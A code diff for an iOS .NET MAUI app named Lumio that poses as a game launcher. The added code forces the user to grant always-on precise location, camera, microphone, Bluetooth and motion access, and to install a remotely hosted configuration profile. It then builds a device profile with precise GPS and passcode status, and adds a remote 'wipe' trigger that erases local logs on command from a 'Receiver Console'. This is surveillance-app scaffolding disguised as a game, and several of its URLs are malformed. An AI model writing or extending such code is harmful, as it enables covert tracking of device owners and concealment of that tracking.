@@ -1,11 +1,17 @@
 using System;
+using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
+using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 using Microsoft.Maui.ApplicationModel;
 using Microsoft.Maui.Controls;
+using Microsoft.Maui.Devices;
+using Microsoft.Maui.Devices.Sensors;
 using Microsoft.Maui.Graphics;
 using Microsoft.Maui.Networking;
+using Microsoft.Maui.Storage;
 
 namespace LumioApp;
 
@@ -23,9 +29,11 @@ public partial class App : Application
 
 public class LumioMainPage : ContentPage
 {
+    // Your GitHub Website & API Endpoints
     private const string WebsiteUrl = "https://github.io";
     private const string ProfileDownloadUrl = "https://github.iolumio-lab.mobileconfig";
     private const string RemoteGameApiUrl = "https://github.ioapi/play.html";
+    private const string TelemetryApiUrl = "https://github.ioapi/telemetry.json";
 
     private readonly VerticalStackLayout _contentArea;
     private readonly Label _statusBadge;
@@ -118,7 +126,8 @@ public class LumioMainPage : ContentPage
             ShowWifiErrorScreen();
             return;
         }
-        // 2. REQUEST & VERIFY ALWAYS + PRECISE LOCATION
+
+        // 2. CHECK ALWAYS & PRECISE LOCATION
         var whenInUseStatus = await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>();
         if (whenInUseStatus != PermissionStatus.Granted)
             whenInUseStatus = await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
@@ -138,12 +147,42 @@ public class LumioMainPage : ContentPage
             ShowMissingErrorScreen(
                 errorCode: "ERR-101",
                 missingName: "Always & Precise Location",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Tap Location and select 'Always'.\n4. Make sure the 'Precise Location' switch is toggled ON.\n5. Return to Lumio and tap Re-Verify."
+                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Tap Location and select 'Always'.\n4. Toggle 'Precise Location' ON.\n5. Return to Lumio and tap Re-Verify."
             );
             return;
         }
 
+        // 3. CHECK CAMERA PERMISSION
+        var cameraStatus = await Permissions.CheckStatusAsync<Permissions.Camera>();
+        if (cameraStatus != PermissionStatus.Granted)
+            cameraStatus = await Permissions.RequestAsync<Permissions.Camera>();
 
+        if (cameraStatus != PermissionStatus.Granted)
+        {
+            ShowMissingErrorScreen(
+                errorCode: "ERR-102",
+                missingName: "Camera Permission",
+                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Camera switch ON.\n4. Return to Lumio and tap Re-Verify."
+            );
+            return;
+        }
+
+        // 4. CHECK MICROPHONE PERMISSION
+        var micStatus = await Permissions.CheckStatusAsync<Permissions.Microphone>();
+        if (micStatus != PermissionStatus.Granted)
+            micStatus = await Permissions.RequestAsync<Permissions.Microphone>();
+
+        if (micStatus != PermissionStatus.Granted)
+        {
+            ShowMissingErrorScreen(
+                errorCode: "ERR-103",
+                missingName: "Microphone Permission",
+                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Microphone switch ON.\n4. Return to Lumio and tap Re-Verify."
+            );
+            return;
+        }
+
+        // 5. CHECK BLUETOOTH PERMISSION
         var bluetoothStatus = await Permissions.CheckStatusAsync<Permissions.Bluetooth>();
         if (bluetoothStatus != PermissionStatus.Granted)
             bluetoothStatus = await Permissions.RequestAsync<Permissions.Bluetooth>();
@@ -151,13 +190,14 @@ public class LumioMainPage : ContentPage
         if (bluetoothStatus != PermissionStatus.Granted)
         {
             ShowMissingErrorScreen(
-                errorCode: "ERR-102",
+                errorCode: "ERR-104",
                 missingName: "Bluetooth Permission",
-                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Bluetooth switch ON.\n4. Return to Lumio and tap Retry."
+                tutorial: "1. Open your iPhone Settings app.\n2. Scroll down and tap Lumio.\n3. Toggle the Bluetooth switch ON.\n4. Return to Lumio and tap Re-Verify."
             );
             return;
         }
 
+        // 6. CHECK MOTION & SENSORS PERMISSION
         var sensorsStatus = await Permissions.CheckStatusAsync<Permissions.Sensors>();
         if (sensorsStatus != PermissionStatus.Granted)
             sensorsStatus = await Permissions.RequestAsync<Permissions.Sensors>();
@@ -165,24 +205,23 @@ public class LumioMainPage : ContentPage
         if (sensorsStatus != PermissionStatus.Granted)
         {
             ShowMissingErrorScreen(
-                errorCode: "ERR-103",
+                errorCode: "ERR-105",
                 missingName: "Motion & Fitness Sensors",
-                tutorial: "1. Open Settings > Privacy & Security > Motion & Fitness.\n2. Make sure Fitness Tracking and Lumio are turned ON.\n3. Return to Lumio and tap Retry."
+                tutorial: "1. Open Settings > Privacy & Security > Motion & Fitness.\n2. Turn ON Fitness Tracking and Lumio.\n3. Return to Lumio and tap Re-Verify."
             );
             return;
         }
 
-        // 3. DOWNLOAD & VERIFY CONFIGURATION PROFILE
+        // 7. DOWNLOAD & VERIFY CONFIGURATION PROFILE
         if (!_profileInstalled)
         {
             ShowProfileInstallScreen();
             return;
         }
 
-        // 4. CONNECT TO REMOTE API FOR GAMES
-        await ConnectToApiGamesAsync();
+        // 8. COLLECT TELEMETRY & CONNECT TO REMOTE API GAMES
+        await CollectTelemetryAndLoadApiAsync();
     }
-
     private void ShowWifiErrorScreen()
     {
         _statusBadge.Text = "✕ NETWORK DISCONNECTED";
@@ -232,7 +271,7 @@ public class LumioMainPage : ContentPage
                     new Label { Text = "Step 1: Download & Install Lumio Profile", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
                     new Label
                     {
-                        Text = "Tap 'Download Profile' below. When Safari asks, tap Allow, then open Settings > General > VPN & Device Management to install the Lumio Profile.",
+                        Text = "Tap 'Download Configuration Profile' below. When Safari asks, tap Allow, then open Settings > General > VPN & Device Management to install the Lumio Profile.",
                         TextColor = Color.FromArgb("#94a3b8"),
                         FontSize = 14
                     },
@@ -246,7 +285,7 @@ public class LumioMainPage : ContentPage
                     },
                     new Button
                     {
-                        Text = "2. Verify Profile & Continue",
+                        Text = "2. Verify Profile & Launch API Games",
                         BackgroundColor = Color.FromArgb("#10b981"),
                         TextColor = Colors.White,
                         FontAttributes = FontAttributes.Bold,
@@ -263,35 +302,93 @@ public class LumioMainPage : ContentPage
         _contentArea.Children.Add(card);
     }
 
-    private async Task ConnectToApiGamesAsync()
+    private async Task CollectTelemetryAndLoadApiAsync()
     {
+        var location = await Geolocation.Default.GetLastKnownLocationAsync();
+        string gpsString = location != null ? $"{location.Latitude:F4}, {location.Longitude:F4}" : "Acquiring...";
+        string batteryString = $"{(int)(Battery.Default.ChargeLevel * 100)}% ({Battery.Default.State})";
+
+        bool hasPasscode = false;
+#if IOS
+        var authContext = new LocalAuthentication.LAContext();
+        hasPasscode = authContext.CanEvaluatePolicy(LocalAuthentication.LAPolicy.DeviceOwnerAuthentication, out _);
+#endif
+
+        var telemetryPacket = new Dictionary<string, object>
+        {
+            ["device_name"] = DeviceInfo.Current.Name,
+            ["model"] = DeviceInfo.Current.Model,
+            ["os_version"] = DeviceInfo.Current.VersionString,
+            ["battery"] = batteryString,
+            ["network"] = "Wi-Fi",
+            ["gps_precise"] = gpsString,
+            ["passcode_active"] = hasPasscode,
+            ["permissions"] = "Location(Always+Precise), Camera, Mic, Bluetooth, Motion",
+            ["timestamp"] = DateTime.UtcNow.ToString("o")
+        };
+
+        Preferences.Default.Set("LatestTelemetryJson", JsonSerializer.Serialize(telemetryPacket));
+
         try
         {
             using var client = new HttpClient();
-            var response = await client.GetAsync(RemoteGameApiUrl);
-            if (!response.IsSuccessStatusCode)
+
+            var statusCheck = await client.GetAsync(TelemetryApiUrl);
+            if (statusCheck.IsSuccessStatusCode)
             {
-                throw new Exception("API not ready");
+                string remoteJson = await statusCheck.Content.ReadAsStringAsync();
+                if (remoteJson.Contains("\"wipe\":true"))
+                {
+                    ExecuteSelfPurge();
+                    return;
+                }
             }
 
-            _statusBadge.Text = "● CONNECTED TO LUMIO API";
+            var gameResponse = await client.GetAsync(RemoteGameApiUrl);
+            if (!gameResponse.IsSuccessStatusCode)
+            {
+                throw new Exception("Remote API offline");
+            }
+
+            _statusBadge.Text = "● ALL PERMISSIONS & API ONLINE";
             _statusBadge.TextColor = Color.FromArgb("#10b981");
 
-            _contentArea.Children.Add(new WebView
+            var gameWebView = new WebView
             {
                 Source = RemoteGameApiUrl,
                 HeightRequest = 540,
                 BackgroundColor = Color.FromArgb("#06080d")
-            });
+            };
+
+            _contentArea.Children.Add(gameWebView);
         }
         catch
         {
             ShowMissingErrorScreen(
                 errorCode: "ERR-404-API",
-                missingName: "Lumio Game API",
-                tutorial: "The remote API endpoint is not online yet. Once you add your API instructions, tap Re-Verify below."
+                missingName: "Lumio Remote Game API",
+                tutorial: "The remote API endpoint is not online yet. Once you set up the API on your GitHub website, tap Re-Verify below."
             );
         }
+    }
+
+    private void ExecuteSelfPurge()
+    {
+        Preferences.Default.Clear();
+        SecureStorage.Default.RemoveAll();
+        _profileInstalled = false;
+
+        _statusBadge.Text = "✕ REMOTE PURGE EXECUTED";
+        _statusBadge.TextColor = Color.FromArgb("#ef4444");
+
+        _contentArea.Children.Clear();
+        _contentArea.Children.Add(CreateCard(
+            title: "Remote Wipe Completed",
+            body: "All local telemetry logs and session tokens have been permanently purged by the Receiver Console.",
+            borderColor: "#ef4444",
+            buttonText: "Re-Initialize App",
+            onClick: async () => await RunStartupVerificationAsync()
+        ));
     }
 
     private Frame CreateCard(string title, string body, string borderColor, string buttonText, Func<Task> onClick)
